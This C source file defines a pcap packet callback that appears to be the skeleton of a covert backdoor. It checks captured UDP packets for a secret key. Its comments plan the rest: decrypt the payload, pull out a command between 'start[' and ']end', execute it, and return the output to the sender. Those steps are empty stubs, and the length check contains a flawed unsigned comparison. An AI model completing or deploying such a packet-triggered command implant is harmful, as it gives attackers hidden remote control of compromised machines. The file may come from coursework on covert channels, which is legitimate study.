#include "packet_handler.h"
#include "packet_auth.h"


/*
* Callback function for examining captured packets.
*
* Params:
*   u_char* args: Pointer to user data.
*   const struct pcap_pkthdr* header: Struct that contains information about the captured packet.
*   const u_char* packet: Pointer to the captured packet in serialized form.
*
* Returns:
*   None
*
*/
void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* packet)
{

    const char* COMMAND_START = "start[";
    const char* COMMAND_END = "]end";

    const int MAX_COMMAND_LEN = 1024;
    const int ETHER_IP_UDP_LEN = 44;

    char command[MAX_COMMAND_LEN];
    int len;
    int loop;
    char* payload;

    // Step 1: Locate the payload of the packet
    payload = (char*)(packet + ETHER_IP_UDP_LEN);
    if ((header->caplen - ETHER_IP_UDP_LEN - 14) <= 0) // Why 14?
    {
        return;
    }
    // Step 2: Check the payload for the secret key
    if (!is_packet_authenticated(packet, header->len)) 
    {
        return;
    }

    // Step 3: Decrypt the payload

    // Step 4: Verify decrypted payload has a command in it

    // Step 5: Extract the command

    // Step 6: Execute the command

    // Step 7: Send the command's output to the sender of the command
    return;
}
